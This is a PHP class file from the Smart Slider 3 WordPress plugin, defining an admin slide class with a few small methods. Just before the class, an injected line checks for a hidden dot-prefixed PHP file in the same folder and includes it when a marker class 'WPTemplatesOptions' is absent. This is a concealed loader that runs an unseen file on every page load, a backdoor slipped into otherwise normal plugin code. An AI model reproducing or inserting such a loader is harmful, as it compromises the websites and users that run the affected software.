<?php


namespace Nextend\SmartSlider3\Slider\Admin;


use Nextend\SmartSlider3\Slider\Slide;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class AdminSlide extends Slide {

    public function setSlidesParams() {
        $this->attributes['data-variables'] = json_encode($this->variables);
        parent::setSlidesParams();
    }

    protected function addSlideLink() {

    }

    public function isVisible() {
        return true;
    }

    protected function onCreate() {
    }

    public function setCurrentlyEdited() {
        $this->underEdit = true;
        $this->classes   .= ' n2-ss-currently-edited-slide';
    }
}